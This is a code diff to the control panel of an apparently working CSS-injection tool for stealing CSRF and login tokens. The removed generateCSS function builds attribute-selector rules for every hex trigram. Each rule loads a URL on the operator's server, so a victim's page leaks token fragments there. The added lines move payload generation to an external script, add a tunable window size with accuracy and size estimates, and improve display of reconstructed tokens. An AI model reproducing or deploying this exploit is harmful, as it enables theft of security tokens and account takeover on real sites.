@@ -189,6 +189,13 @@
       <span class="config-label">length</span>
       <input type="number" id="cfgLength" class="config-input short" min="1">
     </div>
+    <div class="config-row">
+      <span class="config-label">window</span>
+      <select id="cfgWindow" class="config-input">
+        <option value="4">4 chars &mdash; ~99% single guess at 40 chars, ~4.5 MB CSS</option>
+        <option value="3">3 chars &mdash; ~300 KB CSS, longer tokens may give candidates</option>
+      </select>
+    </div>
     <div style="margin-top:12px" class="actions">
       <button class="btn" id="applyBtn">apply</button>
       <span class="status" id="applyStatus"></span>
@@ -227,6 +234,7 @@
   </div>
 </div>
 
+<script src="/payload.js"></script>
 <script>
 let CONFIG = null;
 
@@ -238,6 +246,7 @@ const PRESETS = {
     startSelector: 'token=',
     endSelector: '&operation=login',
     tokenLength: 40,
+    windowSize: 4,
   },
   hidden: {
     selector: 'input[type="hidden"][name="csrf"]',
@@ -246,78 +255,13 @@ const PRESETS = {
     startSelector: '',
     endSelector: '',
     tokenLength: 40,
+    windowSize: 4,
   },
 };
 
 async function copyAsHtml(html) {
   const blob = new Blob([html], { type: 'text/html' });
   await navigator.clipboard.write([new ClipboardItem({ 'text/html': blob })]);
-}
-
-function shortName(index) {
-  let length = 1;
-  while (index >= 26 * 36 ** (length - 1)) {
-    index -= 26 * 36 ** (length - 1);
-    length++;
-  }
-  const place = 36 ** (length - 1);
-  const first = String.fromCharCode(97 + Math.floor(index / place));
-  const rest = length === 1
-    ? ''
-    : (index % place).toString(36).padStart(length - 1, '0');
-  return first + rest;
-}
-
-function generateCSS(cfg) {
-  const { selector, attribute, tag, startContext, endContext, useStartsWith, useEndsWith } = cfg;
-  const server = window.location.origin;
-  const isInput = tag === 'input';
-  const t = isInput ? '+*' : '';
-
-  let css = selector + '{';
-
-  let counter = 0;
-  const midVars = [];
-  const displayVars = [];
-  const hex = 'abcdef0123456789';
-
-  for (let i = 0; i < 16; i++) {
-    for (let j = 0; j < 16; j++) {
-      for (let k = 0; k < 16; k++) {
-        const combo = hex[i] + hex[j] + hex[k];
-        const n = shortName(counter++);
-
-        midVars.push('var(--' + n + ',none)');
-        displayVars.push('var(--m-' + n + ',"")');
-
-        if (useStartsWith) {
-          css += '&[' + attribute + '^="' + combo + '"]' + t + '{--d-s:"' + combo + '";--s:url(' + server + '/log?c=' + combo + '&t=s)}';
-        } else {
-          css += '&[' + attribute + '*="' + startContext + combo + '"]' + t + '{--d-s:"' + combo + '";--s:url(' + server + '/log?c=' + combo + '&t=s)}';
-        }
-
-        css += '&[' + attribute + '*="' + combo + '"]' + t + '{--m-' + n + ':",' + combo + '";--' + n + ':url(' + server + '/log?c=' + combo + '&t=m)}';
-
-        if (useEndsWith) {
-          css += '&[' + attribute + '$="' + combo + '"]' + t + '{--d-e:"' + combo + '";--e:url(' + server + '/log?c=' + combo + '&t=e)}';
-        } else {
-          css += '&[' + attribute + '*="' + combo + endContext + '"]' + t + '{--d-e:"' + combo + '";--e:url(' + server + '/log?c=' + combo + '&t=e)}';
-        }
-      }
-    }
-  }
-
-  if (isInput) {
-    css += "&+*::after{display:block;white-space:pre-wrap;word-break:break-all;color:#00ff41;font-family:'Courier New',monospace;font-size:11px;content:\"\\a start: \" var(--d-s,\"\") \"\\a middle: \" " + displayVars.join(' ') + " \"\\a end: \" var(--d-e,\"\")}";
-    css += '&+*{display:inline-block;background:var(--s,none),' + midVars.join(',') + ',var(--e,none)}';
-  } else {
-    css += "&:after{display:block;white-space:pre-wrap;word-break:break-all;color:#00ff41;font-family:'Courier New',monospace;font-size:11px;content:\"\\a start: \" var(--d-s,\"\") \"\\a middle: \" " + displayVars.join(' ') + " \"\\a end: \" var(--d-e,\"\")}";
-    css += 'background:var(--s,none),' + midVars.join(',') + ',var(--e,none)';
-  }
-
-  css += '}';
-
-  return '<style>' + css + '</style>';
 }
 
 function loadPreset(type) {
@@ -329,20 +273,7 @@ function loadPreset(type) {
   document.getElementById('cfgStart').value = preset.startSelector;
   document.getElementById('cfgEnd').value = preset.endSelector;
   document.getElementById('cfgLength').value = preset.tokenLength;
-}
-
-function loadConfigToForm(cfg) {
-  document.getElementById('cfgSelector').value = cfg.selector;
-  document.getElementById('cfgAttr').value = cfg.attribute;
-  document.getElementById('cfgToken').value = cfg.tokenName;
-  document.getElementById('cfgStart').value = cfg.startContext ? cfg.startContext.slice(0, -2) : '';
-  document.getElementById('cfgLength').value = cfg.tokenLength;
-
-  if (cfg.tag === 'input') {
-    document.getElementById('cfgType').value = 'hidden';
-  } else {
-    document.getElementById('cfgType').value = 'anchor';
-  }
+  document.getElementById('cfgWindow').value = preset.windowSize;
 }
 
 async function applyConfig() {
@@ -353,6 +284,7 @@ async function applyConfig() {
     startSelector: document.getElementById('cfgStart').value,
     endSelector: document.getElementById('cfgEnd').value,
     tokenLength: parseInt(document.getElementById('cfgLength').value, 10) || 40,
+    windowSize: parseInt(document.getElementById('cfgWindow').value, 10),
   };
 
   const status = document.getElementById('applyStatus');
@@ -377,8 +309,6 @@ async function applyConfig() {
   setTimeout(() => { status.textContent = ''; }, 2000);
 }
 
-let pollTimer = null;
-
 async function checkToken() {
   try {
     const res = await fetch('/api/token');
@@ -388,14 +318,13 @@ async function checkToken() {
 
     if (data.status === 'ok') {
       if (data.candidates) {
-        el.innerHTML = '<span style="color:#ff0">ambiguous (' + data.candidates.length + ' candidates):</span><br>' +
+        el.innerHTML = '<span style="color:#ff0">ambiguous (' + data.candidates.length + (data.truncated ? '+' : '') + ' candidates):</span><br>' +
           data.candidates.map(c => '<span style="color:#00ff41">' + c + '</span>').join('<br>');
       } else {
         el.textContent = data.token;
       }
       el.classList.remove('muted');
       dot.className = 'indicator done';
-      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
     } else if (data.status === 'partial') {
       el.textContent = 'receiving chunks... (' + data.chunks + ' so far)';
       el.classList.add('muted');
@@ -419,6 +348,7 @@ async function init() {
   document.getElementById('cfgAttr').value = CONFIG.attribute;
   document.getElementById('cfgToken').value = CONFIG.tokenName;
   document.getElementById('cfgLength').value = CONFIG.tokenLength || 40;
+  document.getElementById('cfgWindow').value = CONFIG.windowSize;
   if (CONFIG.tag === 'input') {
     document.getElementById('cfgType').value = 'hidden';
   }
@@ -451,14 +381,14 @@ async function init() {
   document.getElementById('copyBtn').addEventListener('click', async () => {
     const status = document.getElementById('copyStatus');
     const mode = document.getElementById('copyMode').value;
-    const css = generateCSS(CONFIG);
+    const css = generateCSS(CONFIG, window.location.origin);
     try {
       if (mode === 'test') {
         await copyAsHtml(css);
       } else {
         await navigator.clipboard.writeText(css);
       }
-      status.textContent = 'copied';
+      status.textContent = 'copied (' + (css.length / 1024 / 1024).toFixed(2) + ' MB)';
       status.className = 'status ok';
     } catch (e) {
       status.textContent = 'clipboard failed';
@@ -476,7 +406,8 @@ async function init() {
     document.getElementById('statusDot').className = 'indicator';
   });
 
-  pollTimer = setInterval(checkToken, 2000);
+  // Keep polling so later extractions (after reset or a new config) show up.
+  setInterval(checkToken, 2000);
 }
 
 init();
